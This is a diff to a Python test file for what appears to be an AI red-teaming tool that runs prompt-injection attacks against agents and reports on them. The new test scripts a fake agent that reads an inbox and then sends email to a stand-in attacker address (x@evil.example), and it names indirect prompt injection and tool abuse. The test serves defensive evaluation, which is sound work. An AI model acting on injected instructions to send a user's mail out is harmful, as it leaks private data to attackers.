@@ -15,7 +15,11 @@ from lure.attacks import (
     load_attack,
 )
 from lure.batch import collect_attack_paths
+from lure.report.data import build_report, load_runs
+from lure.report.exec_summary import DEFAULT_GUARDRAIL, exec_summary
 from lure.report.techniques import category_name
+from lure.runner import run_attack
+from tests.fakes import ScriptedAdapter, call, say
 from tests.test_attacks import INBOX, variant, write
 from tests.test_policy import Idle
 
@@ -131,3 +135,14 @@ def test_policy_naming_a_missing_category_is_bad_input(repo, idle, capsys):
     code, _ = run(repo, repo / "attacks" / "indirect_prompt_injection", "--policy", str(policy))
     assert code == cli.EXIT_ERROR
     assert "categories ['tool_abuse'] have no folder under" in capsys.readouterr().err
+
+
+
+def test_new_category_gets_the_default_guardrail(repo):
+    attack = load_attack(new_category(repo))
+    run_attack(attack, ScriptedAdapter(
+        call("read_inbox"),
+        call("send_email", "c2", to=["x@evil.example"], subject="s", body="b"),
+        say("Sent."))).save(repo / "results")
+    bullets = exec_summary(build_report(load_runs([repo / "results"])))
+    assert bullets[-1] == f"Recommended guardrail: {DEFAULT_GUARDRAIL}"
